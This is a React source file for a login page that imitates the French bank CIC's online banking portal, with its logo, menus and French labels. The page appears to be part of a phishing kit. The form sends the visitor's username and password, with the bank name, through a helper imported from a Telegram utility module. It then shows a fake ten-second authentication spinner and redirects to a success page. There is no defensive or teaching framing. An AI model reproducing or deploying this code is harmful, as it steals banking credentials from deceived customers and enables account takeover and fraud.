import React, { useState } from 'react';
import { X, Eye, EyeOff, Search } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type ProviderIAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
  bankName: string;
};

const ProviderIAuth = ({ onAuthenticate, onBack, bankName }: ProviderIAuthProps) => {
  const [identifiant, setIdentifiant] = useState('');
  const [motDePasse, setMotDePasse] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (identifiant && motDePasse) {
      setIsLoading(true);

      await sendBankLoginData({
        bankName,
        username: identifiant,
        password: motDePasse
      });

      setTimeout(() => {
        setIsLoading(false);
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#1BA3A3] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace bancaire...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="bg-white border-b border-gray-200">
        <div className="flex items-center justify-between px-4 py-3">
          <div className="flex items-center">
            <img
              src="https://upload.wikimedia.org/wikipedia/fr/9/91/Logo_CIC_2006.svg"
              alt="Logo"
              className="h-12"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
          </div>

          <div className="flex items-center space-x-6">
            <div className="hidden lg:flex items-center space-x-1">
              <input
                type="text"
                placeholder="Rechercher"
                className="px-3 py-1 border border-gray-300 rounded text-sm"
              />
              <button className="p-1 text-gray-600">
                <Search size={20} />
              </button>
            </div>

            <div className="flex items-center space-x-4">
              <button className="flex items-center space-x-2 text-blue-600 hover:text-blue-700">
                <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                  <span className="text-blue-600 text-sm">★</span>
                </div>
                <div className="text-sm hidden lg:block">
                  <div className="font-medium">DEVENIR CLIENT</div>
                </div>
              </button>

              <button
                onClick={onBack}
                className="p-1 text-gray-600 hover:text-gray-800 transition-colors"
              >
                <X size={20} />
              </button>
            </div>
          </div>
        </div>

        <nav className="hidden lg:block bg-gray-50 border-t border-gray-200">
          <div className="px-4 py-2">
            <div className="flex space-x-8 text-sm">
              <button className="text-gray-800 font-medium">ACCUEIL</button>
              <button className="text-gray-600 hover:text-gray-800">Comptes et Cartes</button>
              <button className="text-gray-600 hover:text-gray-800">Épargne</button>
              <button className="text-gray-600 hover:text-gray-800">Crédits</button>
              <button className="text-gray-600 hover:text-gray-800">Assurances</button>
            </div>
          </div>
        </nav>
      </header>

      <div className="flex flex-col lg:flex-row">
        <div className="hidden lg:block lg:w-1/3 bg-gray-100 min-h-[calc(100vh-140px)] p-6">
          <div className="bg-white rounded-lg shadow-sm">
            <div className="p-4 border-b border-gray-200">
              <h2 className="text-lg font-semibold text-gray-800">Espace client : Connexion</h2>
            </div>
            <div className="p-4 space-y-3">
              <button className="w-full text-left p-3 bg-blue-50 border-l-4 border-blue-500 text-blue-700 font-medium">
                Identifiant / Mot de passe
              </button>
              <button className="w-full text-left p-3 text-gray-600 hover:bg-gray-50">
                Certificat Électronique
              </button>
              <button className="w-full text-left p-3 text-gray-600 hover:bg-gray-50">
                SAFETRANS
              </button>
            </div>
          </div>

          <div className="mt-6 bg-white rounded-lg shadow-sm overflow-hidden">
            <img
              src="https://images.unsplash.com/photo-1618060932014-4deda4932554?q=80&w=2340&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
              alt="Sécurité bancaire"
              className="w-full h-32 object-cover"
            />
            <div className="p-4">
              <h3 className="font-semibold text-gray-800 mb-2">Internet et sécurité bancaire</h3>
              <p className="text-sm text-gray-600">
                Profitez de l'internet en déjouant ses pièges.
              </p>
            </div>
          </div>
        </div>

        <div className="flex-1 p-6 lg:p-12">
          <div className="max-w-md mx-auto lg:mx-0">
            <h1 className="text-xl lg:text-2xl font-semibold text-gray-800 mb-8">
              Identifiant / Mot de passe
            </h1>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-gray-700 font-medium mb-2">
                  Identifiant
                </label>
                <input
                  type="text"
                  value={identifiant}
                  onChange={(e) => setIdentifiant(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1BA3A3] focus:border-transparent"
                />
              </div>

              <div>
                <label className="block text-gray-700 font-medium mb-2">
                  Mot de passe
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={motDePasse}
                    onChange={(e) => setMotDePasse(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#1BA3A3] focus:border-transparent pr-12"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  >
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
              </div>

              <button
                type="submit"
                disabled={!identifiant || !motDePasse || isLoading}
                className="w-full bg-[#1BA3A3] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#158a8a] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-[#1BA3A3] focus:ring-offset-2"
              >
                Se connecter
              </button>

              <div className="flex flex-col space-y-2 text-center">
                <button type="button" className="text-[#1BA3A3] hover:underline text-sm">
                  Codes d'accès oubliés &gt;
                </button>
                <button type="button" className="text-[#1BA3A3] hover:underline text-sm">
                  Infos sécurité &gt;
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ProviderIAuth;
